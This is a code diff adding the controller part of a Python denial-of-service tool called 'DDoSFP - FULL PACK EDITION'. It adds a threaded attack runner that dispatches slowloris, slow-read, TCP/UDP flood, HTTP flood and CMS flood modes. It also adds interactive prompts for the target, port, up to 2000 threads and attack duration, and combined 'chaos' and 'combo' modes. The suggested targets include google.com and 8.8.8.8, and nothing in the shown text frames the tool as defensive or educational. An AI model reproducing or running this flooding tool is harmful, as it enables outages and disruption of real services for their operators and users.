@@ -559,4 +559,432 @@ class AppLayerAttacks:
             except:
                 pass
             s.close()
+                        return 1
+        except Exception:
+            return 0
+
+# ========== ATTACK THREAD ==========
+class AttackThread(threading.Thread):
+    def __init__(self, tid, target, port, mode, duration, rate_limit=0, use_ssl=False):
+        threading.Thread.__init__(self)
+        self.tid = tid
+        self.target = target
+        self.port = port
+        self.mode = mode
+        self.duration = duration
+        self.rate_limit = rate_limit
+        self.use_ssl = use_ssl
+        self.running = True
+        self.requests_sent = 0
+        self.daemon = True
+        self.sockets = []
+
+        # attack menu pick
+        if mode in ['slowloris', 'slowread', 'slowpost', '404']:
+            self.attack_class = RTAAttacks
+            self.is_slow = True
+        elif mode in ['tcpflood', 'udpflood']:
+            self.attack_class = YHCAttacks
+            self.is_slow = False
+        elif mode in ['httpflood', 'httpsflood', 'getflood', 'postflood', 'headflood']:
+            self.attack_class = WebAttacks
+            self.is_slow = False
+        elif mode in ['wpflood', 'joomlaflood', 'drupalflood', 'phpflood']:
+            self.attack_class = CMSAttacks
+            self.is_slow = False
+        else:
+            self.attack_class = AppLayerAttacks
+            self.is_slow = False
+
+    def run(self):
+        start_time = time.time()
+        last_request = 0
+
+        while self.running and (time.time() - start_time < self.duration):
+            try:
+                if self.rate_limit > 0:
+                    now = time.time()
+                    if now - last_request < (1.0 / self.rate_limit):
+                        time.sleep(0.001)
+                        continue
+                    last_request = now
+
+                if self.is_slow:
+                    s = getattr(self.attack_class, self.mode)(self.target, self.port, self.use_ssl)
+                    if s:
+                        self.sockets.append(s)
+                        self.requests_sent += 1
+                        for _ in range(random.randint(3, 8)):
+                            if not self.running:
+                                break
+                            if not getattr(self.attack_class, 'maintain')(s, self.mode):
+                                break
+                            time.sleep(random.uniform(5, 10))
+                else:
+                    result = getattr(self.attack_class, self.mode)(self.target, self.port, self.use_ssl)
+                    if result:
+                        self.requests_sent += 1
+
+                time.sleep(random.uniform(0.01, 0.05))
+
+            except Exception:
+                pass
+
+    def stop(self):
+        self.running = False
+        for s in self.sockets:
+            try:
+                s.close()
+            except:
+                pass
+
+# ========== INPUT VALIDATION  ==========
+def validate_target(target):
+    """Validation IP or domain"""
+    try:
+        # valid IP check
+        ipaddress.ip_address(target)
+        return True
+    except:
+        # valid domain check
+        try:
+            socket.gethostbyname(target)
+            return True
+        except:
+            return False
+
+def validate_port(port):
+    """Validation port"""
+    try:
+        port = int(port)
+        return 1 <= port <= 65535
+    except:
+        return False
+
+def validate_threads(threads):
+    """Validation thread"""
+    try:
+        threads = int(threads)
+        return 1 <= threads <= 2000
+    except:
+        return False
+
+def validate_duration(duration):
+    """Validation duration"""
+    try:
+        duration = int(duration)
+        return duration >= 1
+    except:
+        return False
+
+def validate_rate(rate):
+    """Validation rate limit"""
+    try:
+        rate = int(rate)
+        return 0 <= rate <= 10000
+    except:
+        return False
+
+# ========== MENU INPUT ==========
+def input_target():
+    """Input target"""
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                      INPUT TARGET                        ║{RESET}")
+    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}example:{RESET} localhost, 192.168.1.1, google.com, 8.8.8.8    {CYAN}║{RESET}")
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
+
+    while True:
+        target = input(f"\n{GREEN}[?] Target {RESET}➜ ").strip()
+        if not target:
+            print(f"{RED}[!] Target cannot be empty!{RESET}")
+            continue
+        if validate_target(target):
+            # Resolve domain ke IP
+            if not target.replace('.', '').isdigit():
+                try:
+                    ip = socket.gethostbyname(target)
+                    print(f"{GREEN}[✓] {target} → {ip}{RESET}")
+                    return ip
+                except:
+                    print(f"{RED}[!] failed resolve domain{RESET}")
+                    continue
+            return target
+        else:
+            print(f"{RED}[!] Target not valid!{RESET}")
+
+def input_port():
+    """Input port"""
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                       INPUT PORT                         ║{RESET}")
+    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Example:{RESET} 80 (HTTP), 443 (HTTPS), 8080, 21, 22, 53      {CYAN}║{RESET}")
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
+
+    while True:
+        port = input(f"\n{GREEN}[?] Port {RESET}➜ ").strip()
+        if validate_port(port):
+            return int(port)
+        else:
+            print(f"{RED}[!] Port must be a number 1-65535!{RESET}")
+
+def show_mode_menu():
+    """menu mode"""
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                            PICK ATTACK MODE                                  ║{RESET}")
+    print(f"{CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")
+
+    # Group by category
+    categories = {}
+    for key, mode in MODES.items():
+        cat = mode['cat']
+        if cat not in categories:
+            categories[cat] = []
+        categories[cat].append((key, mode))
+
+    for cat, modes_list in categories.items():
+        print(f"{CYAN}║{RESET} {PURPLE}{BOLD}┌─ {cat} ─{RESET}")
+        for key, mode in modes_list:
+            print(f"{CYAN}║{RESET} │ {GREEN}{key}{RESET}. {mode['desc']}")
+        print(f"{CYAN}║{RESET}")
+
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}")
+
+def input_mode():
+    """Input mode attact"""
+    show_mode_menu()
+
+    while True:
+        choice = input(f"\n{GREEN}[?] Pick mode (1-25) {RESET}➜ ").strip()
+        if choice in MODES:
+            mode_info = MODES[choice]
+            print(f"{GREEN}[✓] Mode: {mode_info['desc']}{RESET}")
+            return mode_info['name']
+        else:
+            print(f"{RED}[!] Pilih nomor 1-25!{RESET}")
+
+def input_threads():
+    """Input thread"""
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                         THREAD                           ║{RESET}")
+    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Information:{RESET} more = stronger")
+    print(f"{CYAN}║{RESET} {YELLOW}Rekomended:{RESET} 50-200 for general connection")
+    print(f"{CYAN}║{RESET} {YELLOW}Max:{RESET} 2000 thread")
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
+
+    while True:
+        threads = input(f"\n{GREEN}[?] amount thread (default 50) {RESET}➜ ").strip()
+        if not threads:
+            return 50
+        if validate_threads(threads):
+            return int(threads)
+        else:
+            print(f"{RED}[!] Thread must be a number 1-2000!{RESET}")
+
+def input_duration():
+    """Input duration attack"""
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                    ATTACK DURATION                       ║{RESET}")
+    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Information:{RESET} in second")
+    print(f"{CYAN}║{RESET} {YELLOW}Rekomended:{RESET} 60-300 second for testing")
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
+
+    while True:
+        duration = input(f"\n{GREEN}[?] Duration (second, default 60) {RESET}➜ ").strip()
+        if not duration:
+            return 60
+        if validate_duration(duration):
+            return int(duration)
+        else:
+            print(f"{RED}[!] Duration must be a positive number!{RESET}")
+
+def input_rate():
+    """Input rate limit"""
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                    RATE LIMIT                            ║{RESET}")
+    print(f"{CYAN}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Information:{RESET} Request per second per thread")
+    print(f"{CYAN}║{RESET} {YELLOW}Rekomended:{RESET} 10-50 for stable connection")
+    print(f"{CYAN}║{RESET} {YELLOW}0 = Unlimited{RESET}")
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
+
+    while True:
+        rate = input(f"\n{GREEN}[?] Rate limit (default 10) {RESET}➜ ").strip()
+        if not rate:
+            return 10
+        if validate_rate(rate):
+            return int(rate)
+        else:
+            print(f"{RED}[!] Rate harus angka 0-10000!{RESET}")
+
+def input_ssl():
+    """Input SSL option"""
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                    HTTPS/SSL?                            ║{RESET}")
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════╝{RESET}")
+
+    while True:
+        ssl_choice = input(f"\n{GREEN}[?] Using HTTPS/SSL? (y/n, default n) {RESET}➜ ").strip().lower()
+        if not ssl_choice or ssl_choice == 'n':
+            return False
+        if ssl_choice == 'y':
+            return True
+        print(f"{RED}[!] input y or n!{RESET}")
+
+# ========== MAIN FUNCTION ==========
+def main():
+    show_banner()
+
+    print(f"{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}")
+    print(f"{GREEN}{BOLD}                    YKAZZZ - DDoSFP - FULL PACK EDITION{RESET}")
+    print(f"{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}")
+
+    # Input data
+    target = input_target()
+    port = input_port()
+    mode = input_mode()
+    threads = input_threads()
+    duration = input_duration()
+    rate = input_rate()
+    use_ssl = input_ssl()
+
+    # summary
+    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║                                    SUMMARY                                   ║{RESET}")
+    print(f"{CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Target    {RESET}➜ {GREEN}{target}:{port}{RESET}                                                 {CYAN}║{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Mode      {RESET}➜ {GREEN}{mode}{RESET}                                                    {CYAN}║{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Threads   {RESET}➜ {GREEN}{threads}{RESET}                                                    {CYAN}║{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Duration  {RESET}➜ {GREEN}{duration} detik{RESET}                                                {CYAN}║{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}Rate      {RESET}➜ {GREEN}{rate if rate > 0 else 'Unlimited'}{RESET}                                                {CYAN}║{RESET}")
+    print(f"{CYAN}║{RESET} {YELLOW}SSL       {RESET}➜ {GREEN}{'Ya' if use_ssl else 'no'}{RESET}                                                   {CYAN}║{RESET}")
+    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}")
+
+    # confirm
+    print(f"\n{RED}{BLINK}Attack now?{RESET}")
+    confirm = input(f"\n{RED}[?] Attack? (y/n) {RESET}➜ ").strip().lower()
+
+    if confirm != 'y':
+        print(f"\n{YELLOW}[!] canceled{RESET}")
+        sys.exit(0)
+
+    # Handle special modes
+    modes_to_run = []
+
+    if mode == 'random':
+        all_modes = [m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL']
+        mode = random.choice(all_modes)
+        print(f"\n{YELLOW}Random Mode: {mode}{RESET}")
+        modes_to_run = [mode]
+
+    elif mode == 'chaos':
+        print(f"\n{YELLOW}CHAOS MODE ACTIVE! auto change mode every 30 second{RESET}")
+        modes_to_run = ['chaos']
+
+    elif mode == 'combo':
+        all_modes = [m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL']
+        combo_modes = random.sample(all_modes, 3)
+        print(f"\n{PURPLE}COMBO MODE ACTIVE!{RESET}")
+        for m in combo_modes:
+            print(f"    • {m}")
+        modes_to_run = combo_modes
+
+    elif mode == 'idiot':
+        print(f"\n{RED}IDIOT MODE ACTIVE! All mode running alternate{RESET}")
+        all_modes = [m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL']
+        modes_to_run = all_modes.copy()
+        random.shuffle(modes_to_run)
+
+    else:
+        modes_to_run = [mode]
+
+    # Start attack
+    print(f"\n{GREEN}[+] Release {threads} thread JDII...{RESET}")
+
+    all_threads = []
+
+    # crate threads every mode
+    for mode_to_run in modes_to_run:
+        mode_threads = max(1, threads // len(modes_to_run))
+        for i in range(mode_threads):
+            t = AttackThread(i, target, port, mode_to_run, duration, rate, use_ssl)
+            t.start()
+            all_threads.append(t)
+            time.sleep(0.01)
+
+    # Monitoring
+    start_time = time.time()
+    last_chaos_time = start_time
+
+    try:
+        while time.time() - start_time < duration:
+            time.sleep(2)
+            total_req = sum(t.requests_sent for t in all_threads)
+            elapsed = int(time.time() - start_time)
+            remaining = duration - elapsed
+
+            # Chaos mode - change mode every 30s
+            if mode == 'chaos' and time.time() - last_chaos_time >= 30:
+                new_mode = random.choice([m['name'] for m in MODES.values() if m['cat'] != 'SPECIAL'])
+                print(f"\n{YELLOW}🔄 Chaos mode change to: {new_mode}{RESET}")
+                for i in range(threads // 5):
+                    t = AttackThread(i+1000, target, port, new_mode, duration - elapsed, rate, use_ssl)
+                    t.start()
+                    all_threads.append(t)
+                last_chaos_time = time.time()
+
+            # count rate
+            req_rate = total_req / elapsed if elapsed > 0 else 0
+
+            # Progress bar
+            bar_length = 30
+            filled = int(bar_length * elapsed / duration)
+            bar = '█' * filled + '░' * (bar_length - filled)
+
+            # Mode description
+            if mode == 'chaos':
+                current_mode = "CHAOS"
+            elif len(modes_to_run) > 1:
+                current_mode = f"COMBO({len(modes_to_run)})"
+            else:
+                current_mode = mode
+
+            print(f"\r[{bar}] {elapsed}s/{duration}s | "
+                  f"Mode: {current_mode} | "
+                  f"Req: {total_req:,} | "
+                  f"Rate: {req_rate:.0f}/s | "
+                  f"Remaining: {remaining}s", end="")
+
+    except KeyboardInterrupt:
+        print(f"\n\n{RED}[!] Attack stopping...{RESET}")
+
+    # Stop all threads
+    for t in all_threads:
+        t.stop()
+
+    # Wait for threads
+    for t in all_threads:
+        t.join(timeout=1)
+
+    # Final stats
+    total_requests = sum(t.requests_sent for t in all_threads)
+    elapsed = int(time.time() - start_time)
+
+    print(f"\n\n{GREEN}════════════════════════════════════════════════════════════════{RESET}")
+    print(f"{GREEN}[✓] ATTACK DONE!{RESET}")
+    print(f"{GREEN}    Total requests: {total_requests:,}{RESET}")
+    print(f"{GREEN}    Duration: {elapsed} detik{RESET}")
+    print(f"{GREEN}    Average rate: {total_requests/elapsed:.0f} req/s{RESET}")
+    print(f"{GREEN}════════════════════════════════════════════════════════════════{RESET}")
+    print(f"\n{CYAN}DDoSFP - DDoSFullPack - ready to attcak!{RESET}")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{RED}[!] JDII terminated{RESET}")
+    except Exception as e:
+        print(f"\n{RED}[!] Error: {e}{RESET}")
   
